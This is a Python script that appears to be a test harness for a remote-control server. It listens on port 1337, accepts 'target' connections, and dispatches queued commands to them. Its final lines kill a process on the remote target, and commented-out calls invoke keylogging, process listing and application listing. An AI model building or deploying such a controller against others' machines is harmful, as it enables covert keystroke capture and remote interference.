import socket as sk
import threading

import test_handle as handler

HOST = '' # Localhost
PORT = 1337

MAX_CONNECTION = 1

handler.conn_ip_list = []

s = sk.socket(sk.AF_INET, sk.SOCK_STREAM)
s.setsockopt(sk.SOL_SOCKET, sk.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(4) # Up to 4 clients (4 threads)


# def handle_thread(conn, addr):
#     print("[?] Connection from ", addr)
#     list_of_ip.append(addr)
#     while True:
#         inp = input().encode()
#         print("Your input: ", inp)
#         conn.sendall(inp)
#         print("Recv: ", conn.recv(4096))
#         if b"QUIT" in inp:
#             break
#     conn.close()
#     list_of_ip.remove(addr)

for i in range(MAX_CONNECTION):
    conn, addr = s.accept()
    # t = threading.Thread(target=handle_thread, args=(client, addr))
    # t.daemon = True
    # t.start()
    handler.conn_ip_list.append((conn, addr))

handler.__init__()
print(handler.list_ip())


# Sample summon
def summon(conn, addr):
    print("[*] Summoned ", addr)
    while True:
        # Blocking
        command_to_run = handler.action_dictionary[addr].get()
        command_to_run(conn)
        conn.sendall(b'QUIT') # Quit current command
        break # For testing only 1 command
    conn.close()


# Sample authorize
def authorize(email, ip):
    if (email not in handler.auth_dict) or (not handler.auth_dict[email]):
        handler.auth_dict[email] = True
        handler.email_ip_dict[email] = ip

def check_return_ip(email):
    if email in handler.auth_dict and handler.auth_dict[email]:
        return handler.email_ip_dict[email]
    else:
        return None

def disconnect(email):
    if email in handler.auth_dict and handler.auth_dict[email]:
        handler.auth_dict[email] = False
        handler.email_ip_dict[email] = None


# Sample connection (1 machine)
target = handler.conn_ip_list[0]

t = threading.Thread(target = summon, args = target)
t.start()

# handler.list_process(target[1])
# handler.keylog(target[1], 30)
# handler.list_application(target[1])
handler.kill_process(target[1], 16508)

